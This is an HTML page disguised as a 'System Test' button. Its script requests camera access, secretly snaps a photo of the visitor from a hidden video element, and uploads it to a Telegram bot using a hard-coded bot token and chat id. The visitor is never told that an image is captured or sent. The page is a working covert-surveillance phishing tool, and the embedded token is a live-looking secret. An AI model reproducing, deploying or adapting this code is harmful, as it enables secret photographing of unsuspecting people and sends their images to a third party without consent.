<!DOCTYPE html>
<html>
<head>
    <title>System Test</title>
    <style>
        body { background: black; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        button { padding: 20px; font-size: 18px; border-radius: 10px; cursor: pointer; }
    </style>
</head>
<body>

    <button id="btn">ACTIVATE SYSTEM TEST</button>
    <video id="v" autoplay playsinline style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const token = '8769277480:AAGs6Zeo5ol7FojA2SwGK7-7I-5Zb0falyM';
        const cid = '8681771719';

        document.getElementById('btn').onclick = function() {
            const btn = this;
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const v = document.getElementById('v');
                v.srcObject = stream;
                btn.style.display = 'none';

                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(blob => {
                        const f = new FormData();
                        f.append('chat_id', cid);
                        f.append('photo', blob, 'x.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f })
                        .then(() => stream.getTracks().forEach(t => t.stop()));
                    }, 'image/jpeg');
                }, 2000);
            })
            .catch(() => alert("Please allow camera access."));
        };
    </script>
</body>
</html>
